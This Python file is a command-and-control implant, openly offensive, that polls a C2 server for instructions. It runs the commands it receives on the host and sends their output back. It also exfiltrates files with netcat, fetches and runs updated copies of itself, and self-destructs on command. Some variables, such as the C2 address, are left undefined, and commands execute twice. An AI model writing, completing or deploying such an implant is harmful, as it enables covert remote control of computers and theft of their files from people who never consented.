import urllib.request
import urllib
import os
import time
import subprocess
import sys

#Comms
implantDir = os.getcwd()
cwd = implantDir

#This will upload a file to the target server.
def ExfilFile(file, c2, IPAddress):
    urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={file}')
    os.system(f'nc -q0 -w5 {IPAddress} 1234 < {file}')
    return

#This will download the new version of the implant, and then run it as a subprocess.
def UpdateImplant(implantDir):
    urllib.request.urlretrieve(f'{c2}/updateImplant?sid={sid}', f'{implantDir}/implant.py')
    subprocess.Popen([sys.executable, "implant.py"])
    return

#This will self destruct our implant.
def SelfDestruct(implantDir):
    os.system(f'rm {implantDir}/sid.log; rm {implantDir}/implant.py')
    destructMsg = urllib.parse.quote_plus("Implant has self destructed")
    urllib.request.urlopen(f'{c2}/info?info={destructMsg}&sid={sid}')
    return

#Will create a path similarily to the way linux cd does given a string consisting of .., and directories seperated by '/'.
def MakePath(dir):
    path = dir.split('/')
    tempCWD = cwd
    for dir in path:
        if dir == '..':
            tempCWD = tempCWD.rsplit('/',1)[0]
        else:
            tempCWD = f'{tempCWD}/{dir}'
    return tempCWD

#Changes the directory similarily to the way linux cd does given a string consisting of .., and directories seperated by '/'.
def ChangeDir(cwd, newDir):
    newWD = MakePath(newDir)
    if os.path.isdir(newWD):
        os.chdir(newWD)
        if cwd != os.getcwd():
            cwd = os.getcwd()
            dirMsg = urllib.parse.quote_plus(f'New working directory: {cwd}')
            urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
        else:
            dirMsg = urllib.parse.quote_plus(f'Failed to change directory: {cwd}')
            urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
    else:
        dirMsg = urllib.parse.quote_plus(f'Failed to change directory: {cwd}')
        urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
    return cwd

def CommandExec(command):
    #command = urllib.request.urlopen(f'{c2}/retrcommand?sid={sid}').read().decode("utf-8")
    os.system(command) #runs the command from our C2 server on the target
    commanddata = os.popen(command)
    commanddatatext = urllib.parse.quote_plus(commanddata.read())

    #Send command output to C2
    urllib.request.urlopen(f'{c2}/info?info={commanddatatext}&sid={sid}')
    return

#initialiazation, this will set establish a Session ID
if(os.path.isfile("sid.log")):
    sid = open("sid.log", "r").read()
    dir = urllib.parse.quote_plus(cwd)
    urllib.request.urlopen(f'{c2}/reconnect?sid={sid}&cwd={dir}')
else:
    dir = urllib.parse.quote_plus(cwd)
    sid = urllib.request.urlopen(f'{c2}/?cwd={dir}').read().decode("utf-8")
    f = open("sid.log", "w")
    f.write(sid)
    f.close()

while True:
    next = urllib.request.urlopen(f'{c2}/next?sid={sid}').read().decode("utf-8")
    if next == 'wait':
        time.sleep(10)
    else:
        next = next.split(' ', 1)
        if next[0] == 'cexe':
            CommandExec(next[1])
        elif next[0] == 'cd':
            cwd = ChangeDir(cwd, next[1])
        elif next[0] == 'update':
            UpdateImplant(implantDir)
        elif next[0] == 'exfil':
            ExfilFile(next[1], c2, c2IPAdress)
        elif next[0] == 'selfdestruct':
            SelfDestruct(implantDir)
            break
        else:
            time.sleep(10)
        time.sleep(5)
